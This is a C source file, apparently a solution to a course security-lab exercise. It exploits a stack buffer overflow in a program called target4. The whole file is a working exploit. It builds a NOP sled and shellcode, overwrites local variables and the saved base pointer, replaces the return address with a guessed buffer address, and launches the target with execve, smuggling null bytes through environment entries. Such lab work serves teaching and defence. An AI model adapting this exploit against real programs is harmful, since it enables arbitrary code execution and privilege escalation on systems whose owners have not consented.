#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target4"

// Represent the address 0x0000000040a4fd90
#define GUESSED_BUF_ADDR "\x90\xfd\xa4\x40\x00\x00\x00\x00"
// NOP of x86-64 ISA
#define NOP 0x90
// 188 bytes of buf (NOP + shellcode), 12 bytes of \x41 ('A'), 4 bytes of int len, 4bytes of int i, 8 bytes of rbp, 8 bytes rip
#define ATTACK_STRING_SIZE 224
// buffer size defined in target4.c
#define BUF_SIZE 188

int main(void) {

	int SHELLCODE_LENGTH = strlen(shellcode);
	char attack_str[ATTACK_STRING_SIZE];
	int NOP_SIZE = BUF_SIZE - SHELLCODE_LENGTH;

	int offset = 0;
	// rewriting 188 bytes of buf for NOP + shellcode
	memset(attack_str, NOP, NOP_SIZE);
	// 143
	offset += NOP_SIZE;
	memcpy(attack_str + offset, shellcode, SHELLCODE_LENGTH);
	// 188
	offset += SHELLCODE_LENGTH;
	// rewriting the space between int len and buf
	memset(attack_str + offset, '\x41', 12);
	// 200
	offset += 12;
	// rewriting int len from 201 = 0x000000c9 to 223 = 0x000000df
	memcpy(attack_str + offset, "\xe0\x00\x00\x00", sizeof(int));
	// 204
	offset += sizeof(int);
	// keep int i the same 204 = 0x000000cc
	memcpy(attack_str + offset, "\xcc\x00\x00\x00", sizeof(int));
	// 208
	offset += sizeof(int);
	// rewrite rbp
	memset(attack_str + offset, '\x41', sizeof(char *));
	offset += sizeof(char *);
	// rewrite rip = Return Address
	memcpy(attack_str + offset, GUESSED_BUF_ADDR, sizeof(char *));

	char *args[3];
	char *env[10];

	args[0] = TARGET; 
	args[1] = attack_str; 
	args[2] = NULL;

	env[0] = &attack_str[202];
	env[1] = &attack_str[203];
	env[2] = &attack_str[204];
	env[3] = &attack_str[206];
	env[4] = &attack_str[207];
	env[5] = &attack_str[208];
	env[6] = &attack_str[221];
	env[7] = &attack_str[222];
	env[8] = &attack_str[223];
	env[9] = NULL;

	if (0 > execve(TARGET, args, env))
		fprintf(stderr, "execve failed.\n");

	return 0;
}
